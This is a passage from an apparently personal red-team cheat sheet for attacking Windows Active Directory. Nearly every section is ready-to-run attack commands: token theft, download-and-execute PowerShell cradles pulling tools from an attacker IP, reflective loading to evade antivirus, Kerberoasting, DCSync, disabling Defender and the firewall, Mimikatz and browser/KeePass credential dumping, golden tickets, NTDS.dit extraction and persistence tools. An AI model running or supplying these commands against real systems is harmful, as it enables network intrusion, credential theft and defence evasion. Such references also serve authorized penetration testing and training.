Invoke-TokenManipulation -ImpersonateUser -Username &quot;lab\domainadminuser&quot;
Get-Process wininit | Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot;

Can also use incognito from meterpreter to steal access&#x2F;delegation tokens and impersonate users. (Requires Admin&#x2F;SYSTEM Privs)

#Tokenvator https:&#x2F;&#x2F;github.com&#x2F;0xbadjuju&#x2F;Tokenvator

Reflectively Load it with Powershell, Cobalt, SilentTrinity etc...
$wc&#x3D;New-Object System.Net.WebClient;$wc.Headers.Add(&quot;User-Agent&quot;,&quot;Mozilla&#x2F;5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko&#x2F;20100101 Firefox&#x2F;49.0&quot;);$wc.Proxy&#x3D;[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials&#x3D;[System.Net.CredentialCache]::DefaultNetworkCredentials
$k&#x3D;&quot;xxxxxxx&quot;;$i&#x3D;0;[byte[]]$b&#x3D;([byte[]]($wc.DownloadData(&quot;https:&#x2F;&#x2F;xxxxx&quot;)))|%&#123;$_-bxor$k[$i++%$k.length]&#125;
[System.Reflection.Assembly]::Load($b) | Out-Null
$parameters&#x3D;@(&quot;arg1&quot;, &quot;arg2&quot;)
[namespace.Class]::Main($parameters)


Reflectively Load .NET Assembly within Powershell if you cant do it through your C2 Infra<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Juicy-Potato"><a href="#Juicy-Potato" class="headerlink" title="Juicy Potato"></a>Juicy Potato</h4><pre class="line-numbers language-none"><code class="language-none">#Requires SeImpersonatePrivilege (Typically found on service accounts IIS Service, SQL Service etc)

#Reference https:&#x2F;&#x2F;ohpe.it&#x2F;juicy-potato&#x2F;

Requirements: SeAssignPrimaryTokenPrivilege and&#x2F;or SeImpersonatePrivilege

(new-object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;10.10.14.5:8000&#x2F;JuicyPotato.exe&#39;,&#39;C:\Program Files\Microsoft SQL Server\MSSQL12.SQLEXPRESS\MSSQL\Backup\JuicyPotato.exe&#39;)

JuicyPotato.exe -l 1337 -p C:\Users\Public\Documents\Mochan.exe -t * -c &#123;5B3E6773-3A99-4A3D-8096-7765DD11785C&#125;

Mochan.exe &#x3D; Payload
5B3E6773-3A99-4A3D-8096-7765DD11785C &#x3D; Target CLISD

A CLSID is a GUID that identifies a COM class object

Can also use -A flag to specify arguments alongside cmd.exe&#x2F;powershell.exe etc

JUICY POTATO HAS TO BE RAN FROM CMD SHELL AND NOT POWERSHELL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h4><pre class="line-numbers language-none"><code class="language-none">#Check my Blog Post Kerberos Attacks in Depth for Further Information
#https:&#x2F;&#x2F;m0chan.github.io&#x2F;Kerberos-Attacks-In-Depth

Get-DomainSPNTicket -Credential $cred -OutputFormat hashcat

because Hashcat over John anyday right?

Invoke-Kerberoast.ps1

python GetUserSPNs.py -request -dc-ip 10.10.14.15 m0chanad.local&#x2F;serviceaccount

Ofc the above requires access to Port 88 on the DC but you can always port forward if executing GetUserSPNs.py manually.

https:&#x2F;&#x2F;github.com&#x2F;GhostPack&#x2F;SharpRoast --NOW Deprecated-- and incorproated into Rebeus with the kerberoast action<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Kerberoast-with-Python"><a href="#Kerberoast-with-Python" class="headerlink" title="Kerberoast with Python"></a>Kerberoast with Python</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;skelsec&#x2F;kerberoast


IMPORTANT: the accepted formats are the following
&lt;ldap_connection_string&gt; : &lt;domainname&gt;&#x2F;&lt;username&gt;&#x2F;&lt;secret_type&gt;:&lt;secret&gt;@&lt;DC_ip&gt;
&lt;kerberos_connection_string&gt;: &lt;kerberos realm&gt;&#x2F;&lt;username&gt;&#x2F;&lt;secret_type&gt;:&lt;secret&gt;@&lt;DC_ip&gt;



Look for vulnerable users via LDAP
kerberoast ldap all &lt;ldap_connection_string&gt; -o ldapenum

Use ASREP roast against users in the ldapenum_asrep_users.txt file
kerberoast asreproast &lt;DC_ip&gt; -t ldapenum_asrep_users.txt

Use SPN roast against users in the ldapenum_spn_users.txt file
kerberoast spnroast &lt;kerberos_connection_string&gt; -t ldapenum_spn_users.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="AS-Rep-Roasting"><a href="#AS-Rep-Roasting" class="headerlink" title="AS Rep Roasting"></a>AS Rep Roasting</h4><pre class="line-numbers language-none"><code class="language-none">#Accounts have to have DONT_REQ_PREAUTH explicitly set for them to be vulnerable

Get-ASRepHash -Domain m0chanAD.local -User victim

Can also use Rebeus (Reflectively Load .NET Assembly.)

.\Rubeus.exe asreproast<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="DCSync-Also-Post-Exploit"><a href="#DCSync-Also-Post-Exploit" class="headerlink" title="DCSync (Also Post Exploit)"></a>DCSync (Also Post Exploit)</h4><pre class="line-numbers language-none"><code class="language-none">#Special rights are required to run DCSync. Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data. Note that Read-Only Domain Controllers are not  allowed to pull password data for users by default. 

#and anyone with the Replicating Changes permissions set to Allow (i.e., Replicating Changes All&#x2F;Replicating Directory Changes)

mimikatz # lsadump::dcsync &#x2F;domain:corp.local &#x2F;user:Administrator

powershell.exe -Version 2 -Exec Bypass &#x2F;c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;10.10.14.6:8000&#x2F;Invoke-DCSync.ps1&#39;); Invoke-DCSync -PWDumpFormat&quot;


Empire Module: powershell&#x2F;credentials&#x2F;mimikatz&#x2F;dcsync_hashdump<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post Exploitation"></a>Post Exploitation</h2><h4 id="Useful-Commands"><a href="#Useful-Commands" class="headerlink" title="Useful Commands"></a>Useful Commands</h4><pre class="line-numbers language-none"><code class="language-none">net user m0chan &#x2F;add &#x2F;domain
net localgroup Administrators m0chan &#x2F;add

# Enable RDP
reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f

Turn firewall off
netsh firewall set opmode disable

Or like this
reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f

If you get this error:

CredSSP Error Fix -&gt;

Add this reg key:

reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;v UserAuthentication &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f

Disable Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Esenutl-exe-Dump-Locked-File"><a href="#Esenutl-exe-Dump-Locked-File" class="headerlink" title="Esenutl.exe Dump Locked File"></a>Esenutl.exe Dump Locked File</h4><pre class="line-numbers language-none"><code class="language-none">C:\WINDOWS\system32\esentutl.exe &#x2F;y &lt;SOURCE&gt; &#x2F;vss &#x2F;d &lt;DEST&gt;


Can be useful where you want to dump SAM and (or) SYSTEM but the file is locked by the OS (Windows 10)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Check-if-Powershell-Logging-is-Enabled"><a href="#Check-if-Powershell-Logging-is-Enabled" class="headerlink" title="Check if Powershell Logging is Enabled"></a>Check if Powershell Logging is Enabled</h4><pre class="line-numbers language-none"><code class="language-none">reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="Run-Seatbelt-ABSOLUTELY-MUST"><a href="#Run-Seatbelt-ABSOLUTELY-MUST" class="headerlink" title="Run Seatbelt (ABSOLUTELY MUST)"></a>Run Seatbelt (ABSOLUTELY MUST)</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;GhostPack&#x2F;Seatbelt

This is stupidily good, it can literally Enum everything you require and is also a .NET Assembly so can be reflectively loaded to avoid AV :D Win Win

BasicOSInfo           -   Basic OS info (i.e. architecture, OS version, etc.)
RebootSchedule        -   Reboot schedule (last 15 days) based on event IDs 12 and 13
TokenGroupPrivs       -   Current process&#x2F;token privileges (e.g. SeDebugPrivilege&#x2F;etc.)
UACSystemPolicies     -   UAC system policies via the registry
PowerShellSettings    -   PowerShell versions and security settings
AuditSettings         -   Audit settings via the registry
WEFSettings           -   Windows Event Forwarding (WEF) settings via the registry
LSASettings           -   LSA settings (including auth packages)
UserEnvVariables      -   Current user environment variables
SystemEnvVariables    -   Current system environment variables
UserFolders           -   Folders in C:\Users\
NonstandardServices   -   Services with file info company names that don&#39;t contain &#39;Microsoft&#39;
InternetSettings      -   Internet settings including proxy configs
LapsSettings          -   LAPS settings, if installed
LocalGroupMembers     -   Members of local admins, RDP, and DCOM
MappedDrives          -   Mapped drives
RDPSessions           -   Current incoming RDP sessions
WMIMappedDrives       -   Mapped drives via WMI
NetworkShares         -   Network shares
FirewallRules         -   Deny firewall rules, &quot;full&quot; dumps all
AntiVirusWMI          -   Registered antivirus (via WMI)
InterestingProcesses  -   &quot;Interesting&quot; processes- defensive products and admin tools
RegistryAutoRuns      -   Registry autoruns
RegistryAutoLogon     -   Registry autologon information
DNSCache              -   DNS cache entries (via WMI)
ARPTable              -   Lists the current ARP table and adapter information (equivalent to arp -a)
AllTcpConnections     -   Lists current TCP connections and associated processes
AllUdpConnections     -   Lists current UDP connections and associated processes
NonstandardProcesses  -   Running processeswith file info company names that don&#39;t contain &#39;Microsoft&#39;
  *  If the user is in high integrity, the following additional actions are run:
SysmonConfig          -   Sysmon configuration from the registry

And more!!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Dump-Creds"><a href="#Dump-Creds" class="headerlink" title="Dump Creds"></a>Dump Creds</h4><pre class="line-numbers language-none"><code class="language-none">(new-object System.Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;10.10.14.5:8000&#x2F;Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz 

Can also run Mimikatz.exe after some AV Evasion removing strings etc. ippSec has a great tutorial on this.

mimikatz.exe
privlege::debug
sekurlsa::logonPasswords full

The safer method is to dump the process memory of LSASS.exe with MiniDump 
(https:&#x2F;&#x2F;github.com&#x2F;3xpl01tc0d3r&#x2F;Minidump)

(or) https:&#x2F;&#x2F;github.com&#x2F;GhostPack&#x2F;SharpDump

and send the .bin to Mimikatz locally.

sekurlsa::minidump C:\users\m0chan\lssas.dmp

Can also be used for dumping and pass the ticket attacks but will cover this elsewhere.

Mimikatz Guide

#Logon Sessions

sekurlsa::logonPasswords all

#Dump Cache

lsadump::cache

#Dump SAM

lsadump::sam<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Dump-Creds-2"><a href="#Dump-Creds-2" class="headerlink" title="Dump Creds #2"></a>Dump Creds #2</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;AlessandroZ&#x2F;LaZagne

laZagne.exe all
laZagne.exe browsers
laZagne.exe browsers -firefox<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="SessionGopher"><a href="#SessionGopher" class="headerlink" title="SessionGopher"></a>SessionGopher</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;Arvanaghi&#x2F;SessionGopher

Quietly digging up saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP

SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It has WMI functionality built in so it can be run remotely. Its best use case is to identify systems that may connect to Unix systems, jump boxes, or point-of-sale terminals

Invoke-SessionGopher -Thorough

Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Dump-Chrome-Passwords-Also-Post-Exploit-1"><a href="#Dump-Chrome-Passwords-Also-Post-Exploit-1" class="headerlink" title="Dump Chrome Passwords (Also Post Exploit)"></a>Dump Chrome Passwords (Also Post Exploit)</h4><pre class="line-numbers language-none"><code class="language-none">#git clone https:&#x2F;&#x2F;github.com&#x2F;rasta-mouse&#x2F;CookieMonster

CookieMonster creds
CookieMonster.exe cookies -d [domain] -e 
CookieMonster -a 

Must be run in the context of the target users as chrome passwords are encrypted with DPAPI.

Can also use Mimikatz for this.

mimikatz dpapi::chrome &#x2F;in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot;

mimikatz dpapi::chrome &#x2F;in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot; &#x2F;unprotect

mimikatz dpapi::chrome &#x2F;in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Cookies&quot; &#x2F;unprotect<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Dump-Process-Memory-w-Mimikittenz"><a href="#Dump-Process-Memory-w-Mimikittenz" class="headerlink" title="Dump Process Memory w/ Mimikittenz"></a>Dump Process Memory w/ Mimikittenz</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;putterpanda&#x2F;mimikittenz

mimikittenz is a post-exploitation powershell tool that utilizes the Windows function ReadProcessMemory() in order to extract plain-text passwords from various target processes.

The aim of mimikittenz is to provide user-level (non-admin privileged) sensitive data extraction in order to maximise post exploitation efforts and increase value of information gathered per target.

Invoke-Mimikittenz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Dump-KeePass-1"><a href="#Dump-KeePass-1" class="headerlink" title="Dump KeePass"></a>Dump KeePass</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;HarmJ0y&#x2F;KeeThief
#http:&#x2F;&#x2F;www.harmj0y.net&#x2F;blog&#x2F;redteaming&#x2F;keethief-a-case-study-in-attacking-keepass-part-2&#x2F;

Get-Process keepass
tasklist | findstr keepass

Attacking KeePass

#https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;HarmJ0y&#x2F;KeeThief&#x2F;master&#x2F;PowerShell&#x2F;KeeThief.ps1
Import-Module KeeThief.ps1
Get-KeePassDatabaseKey -Verbose

KeeTheft.exe, Microsoft.Diagnostics.Runtime.dll &amp; KeePatched.exe can also be used.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="pypykatz"><a href="#pypykatz" class="headerlink" title="pypykatz"></a>pypykatz</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;skelsec&#x2F;pypykatz

Full python implementation of Mimikatz :D 

pip3 install pypykatz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="SafetyKatz"><a href="#SafetyKatz" class="headerlink" title="SafetyKatz"></a>SafetyKatz</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;GhostPack&#x2F;SafetyKatz

Full C Sharp Implemenatation of Mimikatz that can be reflectively loaded :D 

&quot;SafetyKatz is a combination of slightly modified version of @gentilkiwis Mimikatz project and @subtee&#39;s .NET PE Loader.

First, the MiniDumpWriteDump Win32 API call is used to create a minidump of LSASS to C:\Windows\Temp\debug.bin. Then @subtees PELoader is used to load a customized version of Mimikatz that runs sekurlsa::logonpasswords and sekurlsa::ekeys on the minidump file, removing the file after execution is complete.&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="SharpDPAPI"><a href="#SharpDPAPI" class="headerlink" title="SharpDPAPI"></a>SharpDPAPI</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;GhostPack&#x2F;SharpDPAPI

Full C Sharp Implementation of Mimikatzs DPAPI features which allows access to DPAPI features.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="SharpSniper"><a href="#SharpSniper" class="headerlink" title="SharpSniper"></a>SharpSniper</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;HunnicCyber&#x2F;SharpSniper

Often a Red Team engagement is more than just achieving Domain Admin. Some clients will want to see if specific users in the domain can be compromised, for example the CEO.

SharpSniper is a simple tool to find the IP address of these users so that you can target their box.

C:\&gt; SharpSniper.exe emusk DomainAdminUser DAPass123

User: emusk - IP Address: 192.168.37.130<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="SharpLocker"><a href="#SharpLocker" class="headerlink" title="SharpLocker"></a>SharpLocker</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;Pickfordmatt&#x2F;SharpLocker

SharpLocker helps get current user credentials by popping a fake Windows lock screen, all output is sent to Console which works perfect for Cobalt Strike.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="Check-for-Missing-KB’s"><a href="#Check-for-Missing-KB’s" class="headerlink" title="Check for Missing KB’s"></a>Check for Missing KB’s</h4><pre class="line-numbers language-none"><code class="language-none">watson.exe
Sherlock.ps1

Use Watson.exe Assembly and reflectively load .NET Assembly into memory to avoid antivirus. 

More at the bottom re. Reflectively Loading stuff. (Also does not hurt to change certain strings etc)

https:&#x2F;&#x2F;github.com&#x2F;rasta-mouse&#x2F;Watson<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Decrypt-EFS-Files-with-Mimikatz-if-Admin-System"><a href="#Decrypt-EFS-Files-with-Mimikatz-if-Admin-System" class="headerlink" title="Decrypt EFS Files with Mimikatz if Admin/System"></a>Decrypt EFS Files with Mimikatz if Admin/System</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;gentilkiwi&#x2F;mimikatz&#x2F;wiki&#x2F;howto-~-decrypt-EFS-files

cipher &#x2F;c &quot;d:\Users\Gentil Kiwi\Documents\m0chan.txt&quot; - View if File is EFS Encrypted and whom can Decrypt, sometimes Impersonating a token is easier than manually decrying with mimikatz.

privilege::debug 
token::elevate 
crypto::system &#x2F;file:&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\B53C6DE283C00203587A03DD3D0BF66E16969A55&quot; &#x2F;export

dpapi::capi &#x2F;in:&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-494464150-3436831043-1864828003-1001\79e1ac78150e8bea8ad238e14d63145b_4f8e7ec6-a506-4d31-9d5a-1e4cbed4997b&quot;

dpapi::masterkey &#x2F;in:&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\Protect\S-1-5-21-494464150-3436831043-1864828003-1001\1eccdbd2-4771-4360-8b19-9d6060a061dc&quot; &#x2F;password:waza1234&#x2F;

dpapi::capi &#x2F;in:&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-494464150-3436831043-1864828003-1001\79e1ac78150e8bea8ad238e14d63145b_4f8e7ec6-a506-4d31-9d5a-1e4cbed4997b&quot; &#x2F;masterkey:f2c9ea33a990c865e985c496fb8915445895d80b

openssl x509 -inform DER -outform PEM -in B53C6DE283C00203587A03DD3D0BF66E16969A55.der -out public.pem

openssl rsa -inform PVK -outform PEM -in raw_exchange_capi_0_ffb75517-bc6c-4a40-8f8b-e2c555e30e34.pvk -out private.pem

openssl pkcs12 -in public.pem -inkey private.pem -password pass:mimikatz -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx

certutil -user -p mimikatz -importpfx cert.pfx NoChain,NoRoot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="UAC-Bypass"><a href="#UAC-Bypass" class="headerlink" title="UAC Bypass"></a>UAC Bypass</h4><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;egre55.github.io&#x2F;system-properties-uac-bypass&#x2F; - Read Ghoul writeup on HTB for more Info 

findstr &#x2F;C:&quot;&lt;autoElevate&gt;true&quot; 

C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
C:\Windows\SysWOW64\SystemPropertiesComputerName.exe
C:\Windows\SysWOW64\SystemPropertiesHardware.exe
C:\Windows\SysWOW64\SystemPropertiesProtection.exe
C:\Windows\SysWOW64\SystemPropertiesRemote.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Golden-Ticket-Attack"><a href="#Golden-Ticket-Attack" class="headerlink" title="Golden Ticket Attack"></a>Golden Ticket Attack</h4><pre class="line-numbers language-none"><code class="language-none">#Check my Blog Post Kerberos Attacks in Depth for Further Information
#https:&#x2F;&#x2F;m0chan.github.io&#x2F;Kerberos-Attacks-In-Depth

# To generate the TGT with NTLM
mimikatz # kerberos::golden &#x2F;domain:&lt;domain_name&gt;&#x2F;sid:&lt;domain_sid&gt; &#x2F;rc4:&lt;krbtgt_ntlm_hash&gt; &#x2F;user:&lt;user_name&gt;

# To generate the TGT with AES 128 key
mimikatz # kerberos::golden &#x2F;domain:&lt;domain_name&gt;&#x2F;sid:&lt;domain_sid&gt; &#x2F;aes128:&lt;krbtgt_aes128_key&gt; &#x2F;user:&lt;user_name&gt;

# To generate the TGT with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)
mimikatz # kerberos::golden &#x2F;domain:&lt;domain_name&gt;&#x2F;sid:&lt;domain_sid&gt; &#x2F;aes256:&lt;krbtgt_aes256_key&gt; &#x2F;user:&lt;user_name&gt;

# Inject TGT with Mimikatz
mimikatz # kerberos::ptt &lt;ticket_kirbi_file&gt;


#Inject Ticket with Rebeus
.\Rubeus.exe ptt &#x2F;ticket:&lt;ticket_kirbi_file&gt;

.\PsExec.exe -accepteula \\&lt;remote_hostname&gt; cmd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Child-Domain-to-Forest-Compromise"><a href="#Child-Domain-to-Forest-Compromise" class="headerlink" title="Child Domain to Forest Compromise"></a>Child Domain to Forest Compromise</h4><pre class="line-numbers language-none"><code class="language-none">Domain &#x3D; Logical group of objects (users, computers, servers etc etc) supported from a central location like a DC

Tree &#x3D; Set of domains using same name space (DNS Name)

Trust &#x3D; Agreement between 2 domains that allow cross-domain access to resources etc. i&#x2F;e Michelle@dev.m0chan.com may be able to access resources inside HR.m0chan.com.

Forest &#x3D; Largest Structure composed of all trees.

Most trees are linked with dual sided trust relationships to allow for sharing of resources.

By default the first domain created if the Forest Root.

Lets say we have owned a domain controller and got the KRBTGT Hash (The keys to the castle) we can now create 

Covert-NameToSid target.domain.com\krbtgt
S-1-5-21-2941561648-383941485-1389968811-502

Replace 502 with 519 to represent Enterprise Admins

Create golden ticket and attack parent domain. 


This will not work if there is SID Filtering in place for respective target domain.

harmj0ys article explains it best. 

#http:&#x2F;&#x2F;www.harmj0y.net&#x2F;blog&#x2F;redteaming&#x2F;a-guide-to-attacking-domain-trusts&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Dump-NTDS-dit"><a href="#Dump-NTDS-dit" class="headerlink" title="Dump NTDS.dit"></a>Dump NTDS.dit</h4><pre class="line-numbers language-none"><code class="language-none">C:\vssadmin create shadow &#x2F;for&#x3D;C:
copy \\?
\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\ntds\ntds.dit
.
copy \\?
\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\system32\config\SYSTEM
.
copy \\?
\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\system32\config\SAM
.
reg SAVE HKLM\SYSTEM c:\SYS
vssadmin delete shadows &#x2F;for&#x3D; [&#x2F;oldest | &#x2F;all | &#x2F;shadow&#x3D;]


If you pwn a BackupOperator account with SeBackupPrivilege you can also dump NTDS.dit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="SeBackupPrivlege-Dump-NTDS-dit"><a href="#SeBackupPrivlege-Dump-NTDS-dit" class="headerlink" title="SeBackupPrivlege - Dump NTDS.dit"></a>SeBackupPrivlege - Dump NTDS.dit</h4><pre class="line-numbers language-none"><code class="language-none">Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll

PS C:\m0chan&gt; Get-SeBackupPrivilege
SeBackupPrivilege is disabled

PS C:\m0chan&gt; Set-SeBackupPrivilege

PS C:\m0chan&gt; Get-SeBackupPrivilege
SeBackupPrivilege is enabled

PS C:\m0chan&gt; Copy-FileSeBackupPrivilege P:\Windows\System32\ntds.dit C:\m0chan\ntds.dit -Overwrite
Copied 12582912 bytes

Use diskshadow to mount a shadow copy and then copy Windows\system32\ntds.dit 

Remember and not use C:\Windows\ntds\ntds.dit

reg.exe save hklm\system c:\m0chan\SYSTEM.bak<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="Persistance"><a href="#Persistance" class="headerlink" title="Persistance"></a>Persistance</h2><h4 id="SSH-Shuttle"><a href="#SSH-Shuttle" class="headerlink" title="SSH Shuttle"></a>SSH Shuttle</h4><pre class="line-numbers language-none"><code class="language-none">.&#x2F;run -r root@10.10.110.123 172.16.1.0&#x2F;24 -e &quot;ssh -i Root.key&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="SharPersist"><a href="#SharPersist" class="headerlink" title="SharPersist"></a>SharPersist</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;fireeye&#x2F;SharPersist

C# Libary Designed by FireEye to aid with Persistance using various techniques such as 

KeePass Backdoor
Reg Key
Sch Task Backdoor
Startup Folder (Link File)
Service Backdoor

See there github linked above for full Syntax, very cool work<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="SharpDoor"><a href="#SharpDoor" class="headerlink" title="SharpDoor"></a>SharpDoor</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;infosecn1nja&#x2F;SharpDoor.git

